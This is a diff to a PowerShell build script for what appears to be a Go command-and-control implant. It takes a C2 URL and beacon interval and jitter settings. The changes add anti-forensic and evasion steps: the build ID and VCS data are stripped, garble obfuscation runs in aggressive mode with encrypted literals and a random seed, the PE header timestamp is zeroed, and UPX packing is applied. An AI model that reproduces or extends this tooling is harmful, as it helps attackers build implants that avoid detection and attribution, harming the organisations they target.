@@ -65,7 +65,7 @@ try {
     Pop-Location
 
     # Build ldflags
-    $ldflags = "-s -w"
+    $ldflags = "-s -w -buildid="
     $ldflags += " -X main.C2URL=$([System.Security.SecurityElement]::Escape($C2URL))"
     $ldflags += " -X main.IntervalStr=$Interval"
     $ldflags += " -X main.JitterStr=$Jitter"
@@ -79,7 +79,10 @@ try {
     Write-Host "[*] ldflags: $ldflags"
 
     if ($Garble) {
-        # Use garble for build-time obfuscation
+        # Use garble for build-time obfuscation (aggressive mode)
+        # -literals: encrypt/obfuscate literals (strings, numbers)
+        # -tiny: strip more data, smaller binary
+        # -seed=random: random obfuscation seed each build
         $garbleArgs = @(
             "-literals", "-tiny", "-seed=random"
             "build"
@@ -92,12 +95,13 @@ try {
         & $garbleExe $garbleArgs
         Pop-Location
     } else {
-        # Standard Go build
+        # Standard Go build with max strip
         Push-Location $tmpDir
         & $goExe build `
             -ldflags $ldflags `
             -o $Output `
             -trimpath `
+            -buildvcs=false
             .
         Pop-Location
     }
@@ -114,6 +118,21 @@ try {
 
     Write-Host "[*] Built: $outPath"
     Write-Host "[*] Size: $((Get-Item $outPath).Length / 1KB) KB"
+
+    # Anonymize PE header (Windows-only): zero out timestamp
+    if ($Output -match "\.exe$" -and $IsWindows) {
+        try {
+            $bytes = [System.IO.File]::ReadAllBytes($outPath)
+            # PE header timestamp at offset 0x88 (64-bit) or 0x84 from PE sig
+            $peOffset = [BitConverter]::ToInt32($bytes, 0x3C)
+            $tsOffset = $peOffset + 8
+            if ($tsOffset + 4 -le $bytes.Length) {
+                [Array]::Clear($bytes, $tsOffset, 4)
+                [System.IO.File]::WriteAllBytes($outPath, $bytes)
+                Write-Host "[*] PE header timestamp zeroed"
+            }
+        } catch { Write-Host "[!] PE timestamp clear failed (non-critical)" }
+    }
 
     # UPX compression
     if ($UPX) {
